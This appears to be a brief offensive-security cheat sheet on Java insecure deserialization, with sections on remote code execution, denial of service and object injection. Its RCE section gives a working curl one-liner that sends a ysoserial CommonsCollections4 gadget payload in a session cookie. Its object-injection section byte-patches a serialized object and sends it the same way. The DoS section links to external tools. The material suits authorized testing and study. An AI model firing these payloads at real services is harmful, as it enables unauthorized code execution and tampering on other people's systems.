# Insecure Deserialization

## Table of Contents
- [RCE](#rce)
- [DoS](#dos)
- [Object Injection](#object-injection)

## RCE

### Arbitrary commands can be executed remotely.

- RCE in Java-based services
    ```bash
    curl -X GET https://[VULNERABLE-SERVICE]/ -H "Cookie: JSESSIONID=$(java -jar ysoserial.jar CommonsCollections4 calc.exe | base64)"
    ```

## DoS

### Causes the application to consume excessive resources, leading to service unavailability.

- DoS in Java-based services
    - Github gist, [SerialDOS.java](https://gist.github.com/coekie/a27cc406fc9f3dc7a70d)
    - Github repository, [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner/tree/master?tab=readme-ov-file#manual-tester)

## Object Injection

### Object manipulation can lead to IDOR or logical flaws.

- Object injection in Java-based services
    ```bash
    # Manipulate the 32nd byte of the object to an arbitrary value (1) and send it
    printf '\x01' | dd of=object.ser bs=1 seek=31 count=1 conv=notrunc && curl -X GET https://[VULNERABLE-SERVICE]/ -H "Cookie: JSESSIONID=$(base64 -w 0 object.ser)"
    ```